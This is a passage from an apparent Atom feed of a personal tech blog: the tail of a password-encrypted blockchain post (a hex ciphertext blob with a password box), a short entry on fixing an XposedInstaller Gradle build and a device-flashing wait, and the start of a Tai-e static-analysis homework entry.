fc1714d770fe536a927a6318d004f6b453148da9692eabaab92aa1082bf89159dd20c9881a68af7c96325635061e09948acaa21cf6af50f0714e945d14136a29cee24856b868cd159eebf4221429912c02ee5fef4fc9c9c5f1363533e2856bdda414e25e2d371329d20f27490646bb6e430a371a75e912d2b965b746ea5266b44094dd9da35b1b9b529e3441780420fccb046d43c4726e6ae23c93777b9ee1443b2957a4a1c1b8b945113984363a53c2d4b7bf4e66b84aca40c84b0d6fcaa4aaef1960405f5c84b1ba004bbb05cf1cd45dfa73f6a685d324fa17e55aa82e7350bb275016639b444f5d7d282d4e98626da3da2e7601f0679c86c923563e8a86cf67d39030bd4908980f24c8044a8a8300cfec4ef2e8c8da0653c7b43c56db88c6188241ed9cbe266be77b933f7ada9555f78162633f4224eaa8230e47036e8b37d801167555a37d4604bd491b0bff0a079a5fdb64d0f5b23be638597922f3cc814a4ebc56315f43d5bcdc716a53bc1b0c01c8ea92c5f4bda70ad640e2dae0f64dc0c738c43dfbc9fedf64ae764a7c171c5631442eedeed6b77f6676dce9b05724a9594d86fc82a8b200fb7336bbf80191787345084d06b4c27e341716d4975338067df9de7373e3436151c57782a4bbe661182b7d1da6f238da8e39b2497580612350f2d5df6c5403bf46a58c8af89dc67c856bebdde4acc8841bbb0d1fb5c956d0e66d905f76b4813ff16a1f1d59b319c9aa2cff188d36991460ecf7965eeab499200e0326e48f5540ab65f4659a6e2f40f2fb0ee846cdf457130f283948bf21d2e7a06c19d6a2c090e1d506089dfce96b3057b6cd7e14521b8361a0c1aea521a2269eaa78f5c16d69afd5941da0083239a11dc8f56fd00b9eef24894c76152c7f2dadb8137fb05fce1762880c9f8f3468776e4b854e42b2bfc0fbd0e8120b53c697a2832778c3a4ccc2d180b4775d8c4ffce7845396d5f442b700887cd88be87c486936c5b2a31c3621cd3819674ed30feba850bbadd21a6325398e3c9941046851fded3c49f9688207c25f93593dab287f9ff6b5a7df506126379ac6a24c70bda181e894f9c6546b34cad36caba31e932926843bb220833e664f85e6c8ee302dd03d3688cb48e71a66ddd442a0158692a59473460833c49ecc9e5eb84e4ac510ed6a662c60d19d11f556e674c5ff4e6aeaeb1712cdec85d081a0122c1d4d25c278bdb1473c1d7bd7b1c8ba8dc9b550ae3cbdcb2b326a858bfbc31b737288f17366b5df8d8b8518e6304e2fbc8e6181df365e3869f27cc5f45f07224c13a6b8a1bedaee3e282911fe279d5cf08d9b8f7afea2204671ad986246b82b108df9bb42eddfaa66b656f50da9d0f433887975537a8a822e9bb244c55d3e1fa735a7bb638af5df5c87dbf130f7e9e411263f29ac3bb80110e97326b7809b51fee2084f5a23eab0ee5caedc4f48b08df071b428c6ae9e120f6f66fbd3a9cc1b6a9e812cba6fd826732aeb7935855c59e05ed036b7f85b91b407b78318ccac81dcb9d2b6d419c86119b88f168ad04f7831482acd81f384ff764c3e21b2612c535a35b6907f90e3d02d1df5d84300b7db19f167a95dba1368c5d3ca218928e1027fe584dbbcf5909cac0643fb6a77a802250d30a82ee860fab162af4017020e21bbc82537a2b1f3a1b2a791b450929123bbd568849fb3720a921471eaac3580699a86d6c7071b0c543abea01f46e7c839d413c3aabf1bc2bb642b5ceeb75598123e3c36c49502efc5fe761a89e71afee11e9da80d140aa28a7beca6d8420e827e67ae54ad46d9f6a2552b653287d46aa80617f5c799c89c6b2cf3fd63dad651ef26791c59f7c25566e7ab5880b656dea59daeb91edb7c672890934c2fad972b55a1e658dd757952dbbbfbd4f35be69b66a43a9f35fe3e514e1486a304ac416e1641e763d95460bb3942979a7692c0956f1d2d21d7775c7d1e29434516287a824f826865edd7e97a06dd2207b46d80b97ccf4a5fac7da723462b6e7bbde6e282f0459a2e011a355d7092c3877c5c3a2ba95724c29c4ba5066c85baa800afc7b5d02a342b865aae45b345c50545fdc0ebbe241d75fb581b65a2fa3d1c7d45fd3ff969bc7f8ae02741408e9d3139cb1fd2718b0d55ce9087eb0c2bc90ef19dfd1f1540d17d5fcb2656c56dd90ea002cf6de4fe24740d126884f35584ebf16bde49ba93fec08dadd24b431434f1abc20a5aaf8419944ebd9f8e4ca7b4d1c5268ebea3f85160d8aa192ae34ffb2c7ba308fd05872652563ece85dcec06a246c48e50d23ee039c3b76d5de41787b8b5367bf5e4518af7607810e8e06653629355f5ad2f908acfff143f455a75474116d447e39e773207035ace8125b05562f63b0871574ac4de6c68386e2a0290332505821c04e9ad124e89db78179ce8659457a1fdfeb16bd8dd96f173863a9980b32b8426c95a1bad9b1cdace19fccc89cfc37bebee569d6e039db8b318edfd9481c39bdab68e3d91e3f07811787ee02fe8411f398611d067f3edacfa08a6c3a9676fc29e02a37674b7cec2e9a6860689c08b8d1ae6d64e3709c4c4d6bf02b5ac4eed8822d5e952d10f4787b4e06ef436fe52ba5984f9be1639ba2b7a88c8297c6191e97a7b36e3adc59f291e61caeaf54f0d5c5c2819ef0270a6197b28711a91d32c7ce726eca94cf96e5a0c7d973b7101a5d0511655729008b7e4328f4d96f1d01ebfe4fb5cf5437dddccd381ea154eaaa7f063aa4d322ad7da4b2de7bd43211599e7705d1fb15eb64606c38713a2c7997933aad424a011e5b4052cd90ea37a8e64bbd0d5e8b39b89bf4909eaddc60cd19e3add3ef8412f5edca33942006aeb416ff3974ffe7b114f0057d11d6bd230212d63ba0275de3567db2e458c283660e8707631cdc087c7c17d36b18d74bec6aa37fe57827256623b4efcb2aad46aeb10ef9f03e98c6c84e87b3a10a794959e283cad496c007ae8d75db5cb1ad0fffd8cc08b66cbad1f3a9ca049f9333179bc7ec0c087e0a71aa2bfbd247f1ec824cb56e1f5213b46039cade746a4f877109d47b2adbcb373b3682d8c9347a4479983aa706c921067fc5c1ffc73eafad6979318b09ff98c515a5603a9e1c0e477cfe1edc038bd92b75a90e3b110095101aa64337d61078a4d7ebd12a9ed6e703c34c0a28a7185584137f0f59ebd7164e64c1619906ceb39cba13c25adb83f577cc0121daf99d5d0ebbc4475b27c7f465acbd88c76f75b195294f953704946406cf85819c0219701c2092ac1b69025606f5c414909501b138ebe8819839842201bb94b9e9a7453c74142fefe020c0ce6aab6f873aca12a2454eb63ebddd78bba3496367dcce1fc80a7a2a08bb71489890cefd4db23acf90190cbb78eac655a175799faf32c447328c7e61e73d69cde6f5af12cd2b5d1752ec8a5d59e7f60bda802127639acc891e6f7b4015806d90f4f9b8c2632395662e347bd4a0d58759010fa82820ad5bbb60464b4cf4d86a168c43212c7ddeb2d4513ab0fdbc17eb9e0da2a28bc67f243b99693fd0b83bcd1fad9feeaeb4c10dcb76c7d3be58cf4adcb0ba0816201f99372918f4be5a417e60e26e3204fa95c1c38aaede73ac3cffed9040a588e42ad5db3dd90008be0b8e94e25f376ec340f9bc6ccc935390b0172d96d875a35feff82e4d41d22ada7abd4aafaa7b593e40a05409b7d06b08f9386cb1965ea02a0b6a2bdbe1da993adaa6ab555fb6cd8631bfd3582b410f82fe82e052f4408e0145a5897f9c434016820b12225b8b5f60f997538cd209f97b7dc421045aa9adb45beca3aedf09c49af651d197024ceb2137b5af5336e5a52d371cc64ff5b5a0b715dc428cfff7136591712c0f838bbfa01d0101998da1ed429a32de94f0f2185161c8e2a37178faa63e97906c9c49e1784167b9af001c22f2c7bd4b889970d1b82adc1ebb685241384b49165c453cc2cb5ca813890a460510219ea60f98757007095988265a8acd5e1139ba4c3cc45db05afaad8aff5ac9b949fb31d73165c1ec2e92ba84de490af5794a27b20090eb13d2c503a35096cfc18748021f5bcb86853887330af190dbaa124727eaaf21c85097cbd5fa0c33eb29724b1298def87b2c314167267d02a7ea98aeac661b147a284fa9d93cef907cfc8229b964bcc011644d54251410afe849f44cd564392751192dcaff56a25c059a31620d4c5c80c14e23755ed5ddd61ff0b4a916f2a21499d175e4493421f59974509e9d2ead0d01fe2c89ea8a257bf46fd8d323619f76b30f644c99215e538583b3425b3ce2897a7d1f823233aff0fcb333242e7da77be08b712963482aa3c5220d291442cc9c6a463219cbf1bf3fa819a879615a08ee016f575f506216818cc782fbf1b15646b5756a89153c8d88d2adc6ccc4963a0ae0f01772f6c9c22a4950da24f5794fce58377ba469d4dda09dc0ea57a019ffdeed901e5cec738ea64eb695f97b8dd7d7bb9eaa2a195235e8c50affefb3ca22d983a1333f2e58397a8c414853f598f339720147e5e1af91c196a5b754ef4a045d143d1faca938f23c813d557b40428879702c70f6325ba83de6ce4305d58186616e29b3e2f283316efc7d3fc03cc53a52cf7f94fde6047e06e6450d60354ec7c06f0d59c38d2b21e6498fdf3caa55514678d7e59b4b61b111b5286e5bd37e751f50b87d31213da21bde223cfab6eaf74056abc6c44da6b5c403842513a8e0bb572273ca03b2acdb80ab045cedaeac9a86af74373f396212f8217fd28630290bb512b11883b42a0b161f5da631d44785a126f839e6108a73a232f814d1bb71762f03c0831036f5bbf1bf3863bd412f02d47458a536e54a450469f3a93a75a05f241ade9da0dd219481d88d597926bd4a30e2aae22440632e9617fda47bf54020876e5c345eb01379905dc6cd6bb23567fefeb8386c601145df4e4e7c4ea5cd1e32a590fd5f3b321b1a255c6d5b1ca74909f48a0e92928ff62d468ed1c70db1315ac252e1a30e478c4a2db7c69a74f7bb5a9f682b8409093d929d7ef03a396e946bfa5c3ce8167acc420c9e9975e6a894d20b6dd9ffd7a5f9423080028e658f2baeb0c587600ada7af8284dcd494f9f76a7890635abb096ddf30dd9da34e6d116d7395e9114ad8f6cdf560590d950db039fb0696e044b9f7848ed15f6e24dbff48166a62abf1790bfb804f6cc20edf213be6e620f86b10d1c99016bd7b1c781e3ea07ad5f12180d14504c0c7a7853190eeecb0ff7782aa510af9119ccb24907bf4ccc009781643d12580e96340fc512cff523fbd078c3b245170d553a1bd737466d09779f28a52ed524992385daf94c2ca165b163386f5916184c3dfbbfb4b08f8ad64473a3db7c8a4ead30b32a10e4bbe7b5b36460908a585c697c65e7d5bd28cb41887c60155475c9eb79e8433a04efc23dc6ef5546802e25c62fc6fe2f0bd76a18130089e8b1451b5f5699a7d2f8f6c1017fa3db66920ae91d479983ab0374507c6731a6f9fbb1f068d964376a80921fd5da809b650bc6a1904f2f816bb13c79e64a0f4fbbd7f07650310fbdb7e4b1e42f04b01b9333db2a35fead9a92de986f926350e7a1ccef746f55e51130b126fd8f76cdffa69973b5643758c5754d12414318f5196962ba335c1e3ee308958e7e442fba88fc471a456d9f85fae280072eb089034751cc07e4d0ad235e627d30b8ed5db3aaabfd6e9fc266743b6f94caa64136a0bb845e256a9355135260a5116f0c00eff48aecf6b8ca8871469f9d891eac05d3130c0528c899c3b41c9bb2a0152e38f6200ad8913dc3cd2d7bbccb5f03f570d84f5d0f5e136d14171ff52a9cdee1ea5abee62f57705ef84055b0302ee076046693210e22adf10110dfa33c0f280e29aa6d6304acefa91b240e5d2b40535682b523094cf91cfd7532baec92c7661ae7b8547996af4ebf3ce3ee366f5640d18ab2ae0c740758542315ad66599de5f946e8a27a8453ff1607804fb6553e31798b0908eb1c5006fddb57d036f7a4437ac282ccad55e2c96040d74da82fbac4a280d829a4d9314f3a3b50e4e40f03fc1e083603c2a081c62ad1b6ebd00ff7523b072590d007a68530edb89b05522359909baaede6a21d4e79502d382025b97273c9316ace0941541105bce0bd7521440d93a104effeb7b3e91ff9abffa01a9dda8d8f94afe813fd1c29bb1b833d90895dcc0364cabd0d1a9dcb898feb42ab1e1eb7ecf9c069ec7cd77dc58219daefb59e4977356cdc979365751b4908e1adc1b1ae16613c90386dddc1be6f823572b3b739c780d33e63d9b0bc95976d3ffc786fb2ca51068a0a2a80396a746afb6ff7198ed6166baeb07259885be3f723351ca5bd8a220427d52f5676b25f0f9d131cfdd9dede74126e756da5a387d350f1785a01584d63336e69bc3bf39a2b50bca6130707a17b34134c621856d08aa25c71b43476febfa5613a1e3e2ab10da0efd5b81a1d90c500a3166e201cac1a9c3b160af383ad6c0416584fa83225f74f98ef8ca865dc16fa7b2d4fec6aeda5d543aae9f65b181f448669cc21ba1496edb9c2f3accfe8811ab9df9cfd8f061c20b5a92ec921ce5894d7d3e3b058cdfcd8863979d4559306b85ffd81902cfe2bfa786d9876ae3ffaca02f124e177767a07ce946840dca3c7bd6adac04d595cb5f5a05386d0877a1348d5de21ddb6c93eac83c3885ca7075deeaee8ee0a7d2951b37ada2f436964c2d3a10fefe754d516b853b360098a8a70e6e7931a3d570afdb0c1c5079174ed846d2a4d8ba5beb040a4a579794a3ef0935f553a6174ed7598541b023a2f43684e676dd130d097765ff0abb09707b430f18caecd5ca0f1d341cf0db9c092a446cdf75e652f39037016c2251d6c95ab79266d7582df9921c50036f06b1f9c00e190237a63d3a8dc851734b5792dcfdf5e11f800b0b85fa6537244e76a2a39334f91f37f8ccf9def14a1b7c38bc6be7b3884d48b5f2c9a8a1172089106970a713a863d525a3820b194da8d44d32a2e1a278e45f23fd9497069e211ef6466279de45011fb82757c4ea7a8098ad2599e74165ee18d76a6f7c304e0b6b569f5df04ad33e94cefcf97a042f43bd6412aad70e24f65ad9d888dca2e546ea79cc1ef2411bb4a7a336fc89bed8c035d9afa4d8a9c6a2c45f43279aa1eb0b5f8d0831c29ec10c3359b62cbcad31e74e69e292b172969b3fd5cadf901b9198a04f24062ac82c7f2305d53140b33c1f5fcd656cddd2d3916dc78772097bd00f1ea4aa0ae2073193250567a329d2e2ab8a29122ccbb3df62ed6c30bac9a1019aa39450ae8f245162228cf40a0fba611308642c483479590ac793f4fdec1f69b8594c425b33b651b63280df29dce0307be3fb541d7c7bf162efc04443602fceceace6bc72a93718cd164ab5bf0789c3fd2358f6693182824bc28237b33a494e4f52c33bec3d1896eb01ddb092675b20c6ec06e5599c629219c946110b13cab82f4080e8a7d3e588ea68035562938f12b87e89eb570b82ffc80d5aeab89eabafe075fa9977b16cb8c2a7f6e05939f508a8416fd3f6be29b7ee377109e04da00ddee060097526990a9afc66fcdd1106a626c757bcfc81b2146eca120496c7dca6a254386660df0c9eb33c3187b6f526d060b54e4e04c3faacf78e785f346bf5e613227273c99bbcd1e249755ddb177dcc9e6526b8a7ba5e7068661c01c6f8e4b62c4aa3586a9c7c654b551bd06050ef1cdd1e4847f89a1d622336c7252d930813b3b414166c3b435b036b38578b50e8a82047589403e99f7869910219e239f875921aaa91400112d7eccd76217b35944ee2cc121c476bd7633baa980b4ec23c3b5f6dfb72de7d1b7194d8bcd343d143ea0d035cc8e40e8399a99093a345d2be5c7870020f3e069464ed24f63c6b8c6ea00fb36821987b1e37da324c1fa6d3af44b4e732c35c7114fd224c543e879f9e8420f1edbc627a5221aef47e2c36da0b0bc71e254c2725af0b641e637c3c28e2312badbe8440ecae4995b6be328d903dcc3c1d68c7c5e665028105e92f51c60c9ab18be07ed143e3ce03ce461d7c35ad28626c106836c736f8f81a83ff00f8f5581236dfbec6d44ad12aa58ec08a62aca6eb39e3bb3b08389221d71653a730850a881cbf4651f3d40640ae5bb8f0610629e4b074be3cae0e6addea6409290df90e4dae3d4e09669f4c568f8bc123cfc979fd41db642bd2573ba7555f6bfc23009d9ff880ce9679a49cb9ca0e4808e260866d6847f896416850d0d4d249b615a53ead9b4eace898245af4695dec7af003dcd95f84ff8e6ed03bb1a4462f2932f7e6575963f935033d5b0da185bde6d6dfa19c29610e476172073eeadfde11e0450de8a99f9dc652c7365c15be44bb0bffbecc991a4521bbe354e518fc019c647b9d092ad596ad1c14b057146e847cf74f1c3839ef3aecd2fab74f7e5f42a3a97b342b54f191034542ad357108562ce44ea97ff4f61403ad4be4ce417e14626aeb1fdb38da142de4b1227db461fdb729f6a2207444e7db0947460c22e46dee3cb248bad138c4504543a3914e1d24fd10758d9f2ff6873fc19cd1be5bc236bedaacdd7621ad0ffebdfc1d37abeafa8baace5a8ec3d4e7dcdb979937afd5f52ac81bdfc492253e83807319516d3dcc1bf4842d0750a4f8f23764cc3fe399f5fe50887f68444d3c159b4ff415a384149b6a1044be238d16fcbcdd7dbf2d13fc221dbbdc82ba222814a0f08db9a80bd4041534e37bcc957fe4cbad3c21d85888bb107423afcd61bbf16b0aa2806430a52eb067d78ffd88bfea6591d0ebf17e953de7b78f51028593f65730ba04721007ac9ad8d905c44d43c510ed9b3f52557be5f4c7ca6b5addcddafbc0f3d8505bde0d44af3826c75a53271be535634582c4d5aab705caa40da6788760acb225979cffb4b9d8d27a3ef09154de511346ab80031dec0f5e16da9196d05c63a62d3b18bc8307a2c328cb920fed7cba16c6f1f91ded0db8c322fa156f4cc8db9df4f44bd9420b15cb4b419c52f95dd52137cfe29c7ff4ac7247b95540505f2f853c09246fbef0bfdf27973f75736583b0eab3c7559152aa2afda73aa8f47304b14efccc3a4d29131ce98aaa616f50c34e01d44f3c8f07b7e11078a7cab3e741d448a4a6a00d3c04d03e4a1a220bfec3762c71950fb67c886bffa1e8bb3a5a8a0b39624ae95e49a9ceb5eccf91520d5752839aec155a7adddd42e4748bd4cff6eec580665d9f624365790f4d6436aa49cf1c94f714663fbda40506cf071507477a10e52578d1b973443713965919491b90eb51cd0cca999d81133b00b035c940cb7246d3a38ee65ee7ea79d834a4260cd43c3ce3e08c98ef72e65db2973ea63fb59b88430fdc1dac1a7334e8962c1fbd841dae6110553b2eab41d3654cb15dac93516c5e0c42743e09705470576234aaf02e1509ff2bfddc6244d498fab30554652192bf70c0a0e4a09a1a3d10ec29a21d2942488303aa559da9981df64eaed7134ec6aecd22bc34a2bba77da948496e3b5818659ec87228777476dbd4363bead030aea545f1979d2203cc939d0bee274d3692b82200f65ae9a0c2a392439ea4d68276b25a52bef7895af234e79fb9b050d07eb2638d8fd3564d82d39c67979bbda7c46e6f7dc25d0ddf587bd488843b45a4f60dac2cd38ae18c03b7ee445e4cdebe2f695da43d63c09087ffabce03ad5efef20e202e9f69c23828729f1a7a9ed5ad28d2ad4cfd81342ed94353da0d5499468e894cab8969ff88183f2e60b463a38e18c9fd951736a4d6e2e3740743e4b55a7328183d34bcc0e181834a25e3fb0821d69dc68bc1e0826208a7e5ffcc003b3ba723908cecf434a2c8867fd8e626dbb1141f5871f6a0a588af1b83151b1d8ba6c9059f3005044a513ce591e2ce604ba6b286c018e16bb30852b6546d302dde1282f8af5f4f289bfdb9f3c0e5b89e676f578cdfde3a74bd936112e9232dd17c8c8420b97183d24a4bd49c4376cc29e72a3f929c5cdbfe639a07c9d4c1faf4056bfc0bb659c14f74c639797881ce5b6e6980ecbe0976545e5091cbd0a2e8368169fc129eb107cfa93f9651d5ac6380dffd302fa59686077d824a1caa9bbdd25d0becd1d1fc76c0fd7f4d960e5495a831840caa194f5845320f473b74222af82c1168450ad6659cae9870784601a37be242fb014252294a5959160c2af533b2b4ff4cba64cb7063eb78e0d561f1e202492bab4e17cade13b56bee8902c3f8d740fa92d6e44e1a8db716b3435a38f8a0466aaebc3c010973456e1e53f4a4f9efb51f48f1c82f3f7ab3155d9af77f6b2d51b7b81ec2f835151f703ddb4e6fe24c614fdc9fc7a821db79e85f0d4ea03432b44cbcf165ed7e7838a20a4ced3190b936548b2883a21fff819ff82e2428470738e6b329a0411f9878be3cb9a315861ab3df49c79aefc3cda2b9dca482e6a0066c5020fef9058959ac36cd1c2a0ba2ae6928d46512e929320c2bdb243c95c263aa5846d8f9a4b318341985614e57acb173977e2a05f48fd152eef1057d3eef1f1e0e574fee814561c5df20e8fee9b0c80400b4dee8adae4140aaaceca045510f11a6f27973123eea92e44dc8656afaba1f4651924891094dd05a06e1d5fe7e323e6cfc94185d92edfd7e9bff784831bf131f14e4751d269a272460f188f3be7a6a4d1dbc9101959da38fb912601742b324d96d0d5c93faac375236df5d031f57e05d7f9c05555af85afe09ce74c315d21e9b741d1c2decbbad041629bdd9f4add5ef2ee1dd26d5ae93da5d16e2ab21d6b6e001a8c4b91b42e89eb0fc4c82bef28ad3041616b8eae2960303a683c90f6f39a3bca5a367a376e63e3375d0e8b842a92bb2d6cb74b25007712ba044ebfbc5a108b9eaf129d9721840d7333336c122b72a47cc7e1bd05646f2ccb1a56a55be68d73d7f0edb504c2c791a0aa93dae27d843900a4e002d0da5bbe41fe189b73443bbcaf27f19a5567f158fe1cd5fc37cd91d5ecbfa34fa7d528de42ebdb8f1cb2970a0e6aa2680de4cc61f6f06edaf969641bc4b6c747a35d86e1eda7a2de26f0c9147785a795ba4a5917893adc2c640fff4d8b2787a8d78c5a52475100138e9ce098703007df27c9f078e23ced424f3e3d64bd94226f731d9b71b987755536716516ef9b57364e631ff37428e0c2c00d3a4031aac87368443b204dae9bad4cf5a400b36d300721cf2902c30a3a8914518277d34dc2a70f7e7881de83ea99d4a4c3da9bd6a0186f2f8ad4170ee355ece0cc5b3cedbed7f11c93ad961fd382fb5506e8223347142cd9d526dc93ee5b7d43dae83ab44c4779bd4e7c196c79b3851a196055c116fee97be2dadb9d5e7d23b3341731b003bfa0fbe719f61e987ae590e2f74dd85eb6cdb62680be5a91b349551854af4d681e81bfb123e69ac3e47a3e8633518dda0321063ecfbcb1f4366c2da764f5040192444afd913a0d7f06a9d84914f3a1bfb1485d3c2c66d3a6465a8bce7d43ada25a9ab8aa1102b6745960dfa5c332c5dc4692bd6e8868e82d25d5500945410d97f76856bf07feff8b10875c7ff0d2dd957084e630c917bf9612c9fd1896ca8ece787050f6480d46fe4322cb51959fdb9b45e27cbb2d28c3a11f580d545b667e9c3b260d51d385dd1fe5b612c0573ae175efdbf40efb7602c9c7ec464eabae1e8ff2d79a5aa85199cd04267420421df6570185b243443663368cdcc8de13941b01bd387c9a8994f7fc641c522ebd7551cf143f3e4d06972bc722426eb00e738f66413fa0e8617d8ba3740fb369828e28c35a9a420ff0bd21d8667dbd65a6f5db42241f709ac098ac4cb2cfbac330326f032b1c0bb2945cc44d4ec571cef7bfe8bb15906cb4c7183705d9a9860ba3820a5cb43791cdaaf7853ef34b8672aa522419617da6bbd526de8b6945b96eec1e97ee21e7b6438e1769016d2bbb710116523940616de0b8f9d7011ede8cefd08b96b5339c4129026f5a64668345b068c28a41318598c77d3afe57d33e6fd3c9d16a401769158fd4f1565e54d23b7c87567da7df20dd801f7844085d35686743fdf12e36b9c53adfd8b1a28bd0610a6fa859f3c1f0b3e55c6e42da3bc1b0424a22cd69bb6d4bd1a422aaf46fcdbe98a18c073bbeff1b781df8a24cac2c7337ef334f482405aadf9271148638b4ed5be5aae5eb10ddcd59be352788cbd4f5145494231b8bd810510a31e8a6fa8ed8402874c93202bd1f01669cc80aecc6cb234ef559541b5ed5c21be41842f051e7368cb7b9f7efe367f95bdb6af1b704afee3360d60d9348f733f56ac6bb73cf2c66313926b59fb73bb92bc143caaa2aaa733cdc18b0ee1a6f3df819c34585eff95fb2f83bae3788638e99ab55f88b55b5d7e207e1ef7e9785816148fffeb937e3e9f7d3c2b0bf14400effaf95c8df2569e444bcd34d8c98bcf738703f9ecff4d2c5e28a8ee4acc10a357c509eea7e995a5e0fcd493f7908b7a039d37870a8a58720262ae00b380609c80d36919a1ee9aac09bd9bcfe880da34a8ffafdba39eaea335fb0783e736e9f9ebd7e0bf4c6caf9e5a0d8848a19bee77f649df8fb6035643d1e1f5d8c7bf314b267a32631ed220dea21c1ddf169c7051efd7c7d5c2f6301f8d0ce1ac0b530cf693892cfc0fb5fef766f20a5ccdaa6fb3387477a666130475cf921360c324033eb77e30132419d1521b2152fa6e7fd5abc7c48120f8395c75eb146a6a64fad96df893fa7137f718ca21e5179b6172b6e9a98ff028cdc6aad39ffca2a2aadcdc857d5be1c7f1305c34902b57fa853e55776d90e7db789896ec164aaf9fc180407a9408432a76057dd17c33db0c9d6c99213428957f9da0f8818030642f28129d69c0f7b30536170a7dc8d6f73e15a82334825486b8c397a850c70b3ffb7e89408412b0b9d5e2925a5147ae4abd94dce639963856b15981fb73bf891fafedcb077b0d2f3f825049bb6c54364f0c22caf256226d3a4adb788441fb95dbad7b509fdbdd40190192141655e36965215b1968363805cac3b946b0097525c1a5c25a8482a7a19d5553e030e76d7ea45c7f5abbb26ce0db694bfcb41d80c8615e618fb234c51fbd9fa05c5242ddaf5b8d05e69531db83ce520ffbcd894bf3db0a6ace1f28cbe196e3d0ae4d25b2806d31d15a489aba9beaf31533e036ce5dc33c9000053ddbd742932b2009d38340a0f255f87ba01d9655aa34506b9122a7fc03f28cb539a0473e7ac75857c27d0db6f000024d81bf6a0064f36635ece345adbbeeff7ca57cb64c630ae05412a6917993542f3ad38c1d77b245863263d4a7b2752ce19644be83ec02be85883962a99b2221763b18905d9d062cb30f38a6a77b81b5356dea972c51877dc3ac83e3b43d334875e44995c3255269c3822e70b1f46b4ef8739f92f4d3e43447bcd036d828840a835d6c367477d5656b627c93203364fcd5e59d33bf156a43ef059bf12c8f312c86fbfca55c0a4ef48d982ce19589314af4a5c763e18bba7d650c9c25a162cfe055d2922ff18a674ca1a367cb8f1563ac3ede53fac8d0d68295cdd83e46c2f9260c3e9bc3baf2b0ef5a0a51f657bb2b718d73f6cf869cb02374b0888490b055bab001012873d6a7f303a1f9fcee88b13a490f3b8372cabf68ce5931f55448e5098b139940146ed4a50852fb847c69e4c9c65e675ec761c2efcb0e12dba7d14d4217d504d2d1cc61badcc4271435a8f4a3e63074f2be822fd6b689d0bc464da13f233e11d4564e573e307f5ab449810a2a4919a1a6e3d60225d9ae5639fed73a4c5078ff4efc01018f99397ca6412b8671cffd002ef3c28427362f75401020ab7a2b4fac45710d41145fb0fb7ec0ec2cc85c0973b985b87b31c1729812f7d942bb7b4dbc14bc3feaf0c2d3679e2c0b77a481e09944bf5b6d71868edafb62d85ff7ba04cdad88b78e9599f26bb2a5a3b14913382cc2dbb77cfc0df06e1579d586770e391708d911a9d022519ee7179aec42edadf91950e48b3b97675f18b08e9559714c47721853415d6a38dd1f313d8b2d6af68147c114606883c92a5c9edd19056d185ff4b457a411f2574bc80da5b13f77872ab1e7cd864e760abd894109f3d6abdcc427e97d7405af01f6083355a93203dbfd712e7ec5cf055c7e30ae92286e156d856b3e0bd71bf1a2ebe3607e1794ca54a81f90f10dd941a9d3db46bd10c07e8a56b79feef02338717e02da6f6970dabb9ac585e4234a9f1966a3c85079322fe763ae3276bc8968a290cc469f</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="blockchain" scheme="https://wd-2711.tech/categories/blockchain/"/>
    
    
  </entry>
  
  <entry>
    <title>some-bugs-fix</title>
    <link href="https://wd-2711.tech/2023/12/05/some-bugs-fix/"/>
    <id>https://wd-2711.tech/2023/12/05/some-bugs-fix/</id>
    <published>2023-12-05T12:38:28.000Z</published>
    <updated>2023-12-06T13:48:23.028Z</updated>
    
    <content type="html"><![CDATA[<h1 id="some-bugs-and-fix-method"><a href="#some-bugs-and-fix-method" class="headerlink" title="some bugs and fix method"></a>some bugs and fix method</h1><p>From this page, I decide use EN to continue my blog.</p><h2 id="Build-XposedInstaller-using-gradle"><a href="#Build-XposedInstaller-using-gradle" class="headerlink" title="Build XposedInstaller using gradle"></a>Build XposedInstaller using gradle</h2><p>When use android studio and build gradle, even I have downgrade JDK to 1.8, and close android studio proxy, also have mistakes. Gradle’s information is below:</p><span id="more"></span><p><img src="/images/some-bugs-fix/image-20231205211039305.png" alt="image-20231205211039305" style="zoom:67%;" /></p><p>Mistakes are below:</p><p><img src="/images/some-bugs-fix/image-20231205211148627.png" alt="image-20231205211148627" style="zoom:67%;" /></p><p><img src="/images/some-bugs-fix/image-20231205211226541.png" alt="image-20231205211226541" style="zoom:67%;" /></p><p>Source code from <a href="https://github.com/rovo89/XposedInstaller/">link</a>.</p><p>Solution: downgrade android studio to <code>android-studio-ide-201.6858069</code>.</p><p>Build XposedInstaller using gradle</p><h2 id="Flash-machine"><a href="#Flash-machine" class="headerlink" title="Flash machine"></a>Flash machine</h2><p>Question: when flash machine, show <code>waiting for any device</code>.</p><p>Solution: <a href="https://www.jianshu.com/p/f34cdd4cce04">link</a>.</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;some-bugs-and-fix-method&quot;&gt;&lt;a href=&quot;#some-bugs-and-fix-method&quot; class=&quot;headerlink&quot; title=&quot;some bugs and fix method&quot;&gt;&lt;/a&gt;some bugs and fix method&lt;/h1&gt;&lt;p&gt;From this page, I decide use EN to continue my blog.&lt;/p&gt;
&lt;h2 id=&quot;Build-XposedInstaller-using-gradle&quot;&gt;&lt;a href=&quot;#Build-XposedInstaller-using-gradle&quot; class=&quot;headerlink&quot; title=&quot;Build XposedInstaller using gradle&quot;&gt;&lt;/a&gt;Build XposedInstaller using gradle&lt;/h2&gt;&lt;p&gt;When use android studio and build gradle, even I have downgrade JDK to 1.8, and close android studio proxy, also have mistakes. Gradle’s information is below:&lt;/p&gt;</summary>
    
    
    
    <category term="杂记" scheme="https://wd-2711.tech/categories/%E6%9D%82%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>tai_e-static-analysis-with-homework</title>
    <link href="https://wd-2711.tech/2023/11/15/tai-e-static-analysis-with-homework/"/>
    <id>https://wd-2711.tech/2023/11/15/tai-e-static-analysis-with-homework/</id>
    <published>2023-11-15T12:40:20.000Z</published>
    <updated>2024-01-27T03:30:00.857Z</updated>
    
